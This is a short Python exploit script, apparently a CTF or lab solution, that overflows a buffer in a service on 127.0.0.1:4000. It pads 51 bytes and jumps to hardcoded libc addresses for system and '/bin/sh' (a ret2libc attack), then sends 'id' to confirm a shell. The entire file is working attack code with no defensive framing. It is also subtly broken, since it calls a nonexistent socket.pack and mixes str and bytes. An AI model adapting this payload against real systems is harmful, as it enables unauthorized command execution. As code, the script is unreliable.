import os
import socket
import struct
import telnetlib
import time


def connect(ip, port):
    return socket.create_connection((ip, port))

def p(x):
    return socket.pack('<I', x)

def u(x):
    # 64 bit の場合は `<I` ではなく `<Q` にする
    return struct.unpack('<I', x)[0]

def interact(s):
    print('----- interactive mode -----')
    t = telnetlib.Telnet()
    t.socket = s
    t.interact()

payload = "A" * 51
# system
payload += p(0xf75f3190)
payload += b'BBBB'
# /bin/sh
payload += p(0xf7713a24)

while True:
    s = connect('127.0.0.1', 4000)

    print(s.recv(1024).decode('utf-8'))
    s.send(payload + b'\n')
    time.sleep(0.1)
    s.send(b'id\nexit\n')
    time.sleep(0.1)
    result = s.recv(1024).decode('utf-8')
    if len(result) > 0:
        print(result)
    break
